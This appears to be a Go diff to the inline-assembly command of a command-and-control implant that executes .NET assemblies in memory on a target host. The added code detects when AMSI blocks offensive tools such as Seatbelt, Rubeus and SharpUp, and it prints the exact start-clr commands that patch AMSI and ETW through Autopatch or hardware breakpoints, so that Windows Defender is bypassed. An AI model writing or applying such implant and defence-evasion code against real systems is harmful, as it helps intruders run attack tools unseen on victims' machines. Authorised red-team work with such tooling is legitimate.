@@ -46,6 +46,7 @@ var (
 	assemblyMutex sync.Mutex
 	runtimeHost   *clr.ICORRuntimeHost
 	clrStarted    bool
+	amsiPatched   bool // tracks whether AMSI was patched via start-clr
 )
 
 // InlineAssemblyCommand implements the inline-assembly command
@@ -168,6 +169,9 @@ func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult
 		}
 		clrStarted = true
 		output.WriteString("[+] CLR started successfully\n")
+		output.WriteString("[!] WARNING: CLR auto-started without AMSI patching.\n")
+		output.WriteString("[!] Offensive assemblies may be blocked by Windows Defender.\n")
+		output.WriteString("[!] For best results, run 'start-clr' with Autopatch first.\n")
 	}
 	assemblyMutex.Unlock()
 
@@ -193,7 +197,24 @@ func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult
 	if loadErr != nil {
 		output.WriteString("\n=== LOAD ERROR ===\n")
 		output.WriteString(fmt.Sprintf("%v\n\n", loadErr))
+
+		// Check for AMSI-blocked indicator: HRESULT 0x8007000b (COR_E_BADIMAGEFORMAT)
+		// AMSI hooks Assembly.Load() and returns BadImageFormatException when it detects
+		// known offensive tools (Seatbelt, Rubeus, SharpUp, etc.)
+		if strings.Contains(loadErr.Error(), "0x8007000b") && !amsiPatched {
+			output.WriteString("*** LIKELY CAUSE: AMSI is blocking this assembly ***\n")
+			output.WriteString("AMSI (Anti-Malware Scan Interface) scans assemblies during CLR loading.\n")
+			output.WriteString("Well-known offensive tools are flagged and blocked with 0x8007000b.\n\n")
+			output.WriteString("FIX: Run 'start-clr' with AMSI patch BEFORE loading assemblies:\n")
+			output.WriteString("  start-clr {\"amsi_patch\": \"Autopatch\", \"etw_patch\": \"Autopatch\"}\n")
+			output.WriteString("  OR\n")
+			output.WriteString("  start-clr {\"amsi_patch\": \"Hardware Breakpoint\", \"etw_patch\": \"Hardware Breakpoint\"}\n\n")
+		}
+
 		output.WriteString("Troubleshooting tips:\n")
+		if !amsiPatched {
+			output.WriteString("  - Run 'start-clr' with AMSI Autopatch or Hardware Breakpoint before executing assemblies\n")
+		}
 		output.WriteString("  - Ensure the assembly is a valid .NET Framework executable (.exe)\n")
 		output.WriteString("  - Ensure it targets .NET Framework 4.x (not .NET Core/.NET 5+)\n")
 		output.WriteString("  - Check that the assembly has a valid Main() entry point\n")
